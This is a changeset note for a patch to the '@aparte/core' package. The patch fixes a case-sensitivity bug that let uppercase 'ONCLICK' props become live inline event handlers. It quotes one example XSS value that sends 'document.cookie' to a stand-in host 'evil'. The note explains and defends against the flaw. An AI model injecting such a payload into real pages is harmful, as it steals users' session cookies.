---
"@aparte/core": patch
---

Uppercase and mixed-case `on*` props (`ONCLICK`) are now dropped like lowercase ones; they previously became live inline handlers.

`applyElementProps` — what the React and Angular wrappers use to spread a consumer's prop bag onto an aparté element — refused `onclick` but tested the key with `key.startsWith('on')`, which only ever matched the lowercase spelling. An attribute name is case-insensitive, so `{ ONCLICK: 'fetch("//evil/?" + document.cookie)' }` fell through to `setAttribute` and wrote exactly the `onclick` the branch existed to refuse.

The check is now `key.toLowerCase().startsWith('on')`, the idiom core's sanitizer already uses. The lowercasing is scoped to that one branch: a CSS custom property IS case-sensitive, so the `--` branch keeps the key it was given.
